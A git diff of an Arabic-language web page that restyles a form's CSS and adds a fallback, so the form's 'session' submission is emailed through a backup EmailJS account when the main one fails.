@@ -27,24 +27,23 @@
     }
 
     form {
-  background: rgba(255, 255, 255, 0.1);
-  padding: 25px;
-  border-radius: 12px;
-  backdrop-filter: blur(15px);
-  -webkit-backdrop-filter: blur(15px);
-  border: 1px solid rgba(255, 255, 255, 0.2);
-  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
-  max-width: 500px;
-  margin: auto;
-  display: flex;
-  flex-direction: column;
-  gap: 10px;
-  opacity: 0;
-  transform: translateY(50px);
-  animation: fadeInUp 1s ease-out forwards;
-}
+      background: rgba(255, 255, 255, 0.1);
+      padding: 25px;
+      border-radius: 12px;
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
+      max-width: 500px;
+      margin: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      opacity: 0;
+      transform: translateY(50px);
+      animation: fadeInUp 1s ease-out forwards;
+    }
 
-    /* حركة الدخول */
     @keyframes fadeInUp {
       to {
         opacity: 1;
@@ -52,7 +51,6 @@
       }
     }
 
-    /* حركة الخروج */
     .fade-out {
       animation: fadeOut 0.6s ease forwards;
     }
@@ -134,34 +132,56 @@
 </form>
 
 <script>
-  (function(){
-    emailjs.init("24CwhSffG61nQM8qj"); // مفتاحك العام
-  })();
-
   const sessionForm = document.getElementById("session-form");
 
-  sessionForm.addEventListener("submit", function(e) {
-    e.preventDefault();
+  const accountMain = {
+    userID: "24CwhSffG61nQM8qj",
+    serviceID: "service_yqk2arm",
+    templateID: "template_0y04gk5"
+  };
 
-    emailjs.sendForm('service_yqk2arm', 'template_0y04gk5', this)
+  const accountBackup = {
+    userID: "Mc6K9lXShr83BZbe6",
+    serviceID: "service_0fcaaby",
+    templateID: "template_d70yj1u"
+  };
+
+  function sendWithBackup(formElement) {
+    // المحاولة الأولى بالحساب الأساسي
+    emailjs.init(accountMain.userID);
+    emailjs.sendForm(accountMain.serviceID, accountMain.templateID, formElement)
       .then(() => {
-        alert("✅ تم إرسال الجلسة إلى البريد الإلكتروني بنجاح");
-        sessionForm.reset();
-
-        // خروج بنعومة قبل الرجوع
-        sessionForm.classList.add("fade-out");
+        alert("✅ تم إرسال الجلسة بالحساب الرئيسي بنجاح");
+        formElement.reset();
+        formElement.classList.add("fade-out");
         setTimeout(() => {
           window.location.href = "/";
         }, 800);
-      }, (error) => {
-        alert("❌ حدث خطأ أثناء إرسال الجلسة");
-        console.error(error);
-      });
-  });
+      })
+      .catch((error) => {
+        console.warn("❗فشل الحساب الرئيسي، تجربة الحساب الاحتياطي...", error);
 
-  // خروج عند غلق الصفحة (إن أردت إضافة حركة عند المغادرة يدويًا)
-  window.addEventListener("beforeunload", () => {
-    sessionForm.classList.add("fade-out");
+        // تجربة الحساب الاحتياطي
+        emailjs.init(accountBackup.userID);
+        emailjs.sendForm(accountBackup.serviceID, accountBackup.templateID, formElement)
+          .then(() => {
+            alert("✅ تم الإرسال باستخدام الحساب الاحتياطي");
+            formElement.reset();
+            formElement.classList.add("fade-out");
+            setTimeout(() => {
+              window.location.href = "/";
+            }, 800);
+          })
+          .catch((finalError) => {
+            alert("❌ فشل الإرسال في كلا الحسابين. يرجى المحاولة لاحقًا.");
+            console.error(finalError);
+          });
+      });
+  }
+
+  sessionForm.addEventListener("submit", function(e) {
+    e.preventDefault();
+    sendWithBackup(this);
   });
 </script>
 
